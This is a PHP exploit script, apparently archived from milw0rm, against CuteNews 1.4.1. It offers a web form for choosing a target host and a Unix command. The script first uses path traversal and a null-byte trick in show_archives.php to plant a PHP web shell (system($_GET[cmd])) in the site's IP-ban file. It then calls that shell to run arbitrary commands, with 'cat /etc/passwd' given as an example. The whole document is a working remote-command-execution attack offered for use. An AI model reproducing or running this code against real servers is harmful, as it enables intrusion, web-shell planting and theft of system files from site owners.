<?php
#  ---cuten141_xpl.php                                      7.13 03/11/2005    #
#                                                                              #
#                  CuteNews 1.4.1  shell injection                             #
#                              by rgod                                         #
#                  site: http://rgod.altervista.org                            #
#                                                                              #
#  usage: launch form Apache, fill in requested fields, then go!               #
#                                                                              #
#  make these changes in php.ini if you have troubles                          #
#  with this script:                                                           #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  mphhh, exploited this two times... really bored ;)                          #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<head><title>CuteNews 1.4.1  remote   commands   execution  </title>  <meta
http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style type=
"text/css"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}
.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
font-style: italic; } --> </style></head> <body> <p class="Stile6"> CuteNews
1 . 4 . 1  (possibly prior versions) remote commands execution</p><p class="Stil
e6">a script by rgod at <a href="http://rgod.altervista.org"    target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%"> <form
name="form1" method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
value&port=value&command=value&proxy=value"><p><input type="text"   name="host">
<span class="Stile5"> hostname (ex: www.sitename.com)  </span></p><p>     <input
type="text" name="path"><span class="Stile5"> path (ex: /cute/ or just /)</span>
</p><p><input type="text"name="port"><span class="Stile5"> specify a port  other
than 80 ( default value ) </span> </p>  <p>  <input  type="text" name="command">
<span  class="Stile5"> a Unix command , example: ls -la  to list directories, ca
t /etc/passwd to show passwd file </span></p><p><input type="text" name="proxy">
<span class="Stile5">  send exploit through an HTTP  proxy (ip:port) </span></p>
<p>   <input   type="submit" name="Submit"  value="go!"> </p></form> </td> </tr>
</table>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}


function sendpacket($packet)
{
global $proxy, $host, $port, $html;
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
     	    $c = preg_match($proxy_regex,$proxy);
            if (!$c) {echo 'Not a valid prozy...'; die; }
            $parts=explode(':',$proxy);
	        echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	        $ock=fsockopen($parts[0],$parts[1]);
	        if (!$ock) { echo 'No response from proxy...'; die;}
	       }
fputs($ock,$packet);
if ($proxy=='')
           {
           $html='';
           while (!feof($ock)) {$html.=fgets($ock);}
           }
     else
           {
           $html='';
           while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
           {
            $html.=fread($ock,1);
           }
           }
fclose($ock);
echo nl2br(htmlentities($html));
}

if (($path<>'') and ($host<>'') and ($command<>''))
{
  if ($port=='') {$port=80;}
  $port=intval(trim($port));
  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
  if ($proxy=='') { $p=$path; } else { $p="http://".$host.":".$port.$path;}
#STEP 1 -> Inject a shell in ipban.db.php...
###############################################################################################
$shell='<?php error_reporting(0); ini_set("max_execution_time",0); system($_GET[cmd]); die;?>';
$shell=urlencode($shell);
#very nice ip to add to banlist... ;) no check fo ip address format, only a stripslashes
###############################################################################################

$packet="GET ".$p."show_archives.php?template=../inc/ipban.mdu%00&member_db[1]=1&action=add&add_ip=".$shell." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet); //show the packet for debugging purposes
sendpacket($packet);

# STEP 2 -> Launch commands
echo '<br> If CuteNews 1.4.1 is unpatched and vulnerable, now you will see '.htmlentities($command).' output...<br>';
$packet="GET ".$p."data/ipban.db.php?cmd=".urlencode($command)." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet); //debugging...
sendpacket($packet);
}
else
{echo 'fill in all requested fields...optionally specify a proxy...';}

?>

# milw0rm.com [2005-11-03]
